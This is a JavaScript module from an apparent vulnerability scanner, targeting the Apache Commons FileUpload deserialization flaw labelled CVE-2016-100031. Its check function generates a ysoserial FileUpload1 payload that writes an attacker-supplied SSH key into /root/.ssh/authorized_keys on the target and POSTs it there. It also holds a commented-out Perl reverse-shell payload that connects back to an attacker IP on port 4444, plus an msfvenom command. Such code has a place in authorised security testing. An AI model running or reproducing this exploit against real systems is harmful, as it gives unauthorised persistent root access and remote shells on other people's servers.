
module.exports={
	tags:"web,acf,CVE-2016-100031,fileupload",
	"ID":"020102",
	des:"CVE-2016-100031,Apache Commons FileUpload 漏洞检测",
	dependencies:"java,",
	VulApps:["https://www.secfree.com/article-1079.html",
		"http://mirrors.jenkins.io/war/2.46/jenkins.war",
		"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/FileUpload1.java"],
	urls:["https://issues.apache.org/jira/secure/attachment/12838910/fix2.patch",
		"https://www.tenable.com/security/research/tra-2016-12"],
	doCheck:function (url,fnCbk)
	{
		/**
 * - copyAndDelete;sourceFile;destDir
 * - write;destDir;ascii-data
 * - writeB64;destDir;base64-data
 * - writeOld;destFile;ascii-data
 * - writeOldB64;destFile;base64-data
		 */
		var szTestIp = "";
		// msfvenom -p cmd/unix/reverse_perl lport=4444 LHOST=
		var _t = this,_s = _t.self,szPF = "/tmp/" + new Date().getTime(),//.ssh/authorized_keys
			szPayload1 = `java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar FileUpload1 'write;/root/.ssh/authorized_keys;${_s.config.xKeys}'`;
			// szPayload1 = `java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"${szTestIp}:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"`;
			_s.child_process.execSync( szPayload1 + ">" + szPF);
		_s.request(_s.fnOptHeader({method: 'POST',uri: url.replace(/\?.*?$/gmi,'')
			,body:_s.fs.createReadStream(szPF)
			// ,formData:
			// {
			// 	my_field:"theFile",
			// 	my_file: _s.fs.createReadStream(szPF),
			// 	attachments:[
			// 		_s.fs.createReadStream(szPF)
			// 	]
			// }
			,headers:
		    {
				"User-Agent": _s.g_szUa,
				'Session': 'xxxxxxxxx',
				'Side' : 'download'
				// ,"Content-Type":"multipart/form-data"
		    }})
		  ,function (error, response, body)
		  {
			_s.child_process.execSync("rm -rf " + szPF);
		    console.log(error||body);
		  	_s.error(error);
		  	body = String(body);
		  	_s.fnShowBody(body);
	  		if(body)
	  		{
	  			body = _s.fnCheckVul1(String(body));

	  			
	  			_s.fnDoBody(body,"CVE-2016-100031",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":szPayload1};
	  				fnCbk(_s.copyO2O(r,o),_t);
	  			});
	  		}
		  }
		);
	}
};